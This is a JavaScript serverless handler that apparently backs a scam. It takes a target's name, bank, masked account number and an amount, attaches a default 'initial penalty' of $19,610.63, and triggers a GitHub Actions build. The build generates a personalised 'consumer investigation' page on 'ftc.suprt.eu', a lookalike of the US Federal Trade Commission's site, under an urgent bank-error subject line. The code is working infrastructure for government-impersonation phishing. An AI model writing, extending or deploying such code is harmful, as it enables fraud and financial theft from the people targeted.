export default async function handler(req, res) {
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  // Retrieve security code from header or body
  const securityCode = req.headers['x-security-code'] || req.body?.security_code;
  const configuredCode = process.env.SECURITY_CODE;

  if (!configuredCode || securityCode !== configuredCode) {
    return res.status(401).json({ error: 'Unauthorized: Invalid security code' });
  }

  // Parse report payload
  const {
    id,
    name,
    email,
    address,
    bank,
    accountEnding,
    accountMasked,
    amount,
    initialPenalty = '$19,610.63',
    subject,
    callbackUrl
  } = req.body || {};

  if (!name || !bank || !amount) {
    return res.status(400).json({ error: 'Missing required fields (name, bank, amount)' });
  }

  // Generate deterministic report details
  const recordId = Math.floor(10000000 + Math.random() * 90000000).toString();
  const bankSlug = bank
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/(^-|-$)/g, '');

  const generatedUrl = `https://ftc.suprt.eu/advice-and-guidance/report/${recordId}/${bankSlug}-consumer-investigation`;

  // Trigger GitHub Actions repository dispatch
  const githubPat = process.env.GH_PAT;
  if (!githubPat) {
    console.error('Error: GH_PAT environment variable not configured in Vercel.');
    return res.status(500).json({ error: 'GitHub PAT credentials not configured on server' });
  }

  try {
    const dispatchResponse = await fetch('https://api.github.com/repos/lrry0/ftc-consumer-advice/dispatches', {
      method: 'POST',
      headers: {
        'Authorization': `token ${githubPat}`,
        'Accept': 'application/vnd.github.v3+json',
        'User-Agent': 'FTC-Report-Builder',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        event_type: 'new-report',
        client_payload: {
          id: id || null,
          recordId,
          name,
          email: email || null,
          address: address || null,
          bank,
          accountEnding: accountEnding || '',
          accountMasked: accountMasked || `XXXXXXXXX${accountEnding || ''}`,
          amount,
          initialPenalty,
          subject: subject || 'Urgent Resolution Required Error in transaction in your bank',
          callbackUrl: callbackUrl || null
        }
      })
    });

    if (!dispatchResponse.ok) {
      const errorText = await dispatchResponse.text();
      console.error('GitHub API Error:', errorText);
      return res.status(502).json({ error: 'Failed to trigger build pipeline in GitHub Actions' });
    }

    return res.status(200).json({
      success: true,
      recordId,
      url: generatedUrl,
      message: 'GitHub Actions report generation triggered successfully'
    });

  } catch (error) {
    console.error('Callback error:', error);
    return res.status(500).json({ error: 'Internal server error during dispatch' });
  }
}
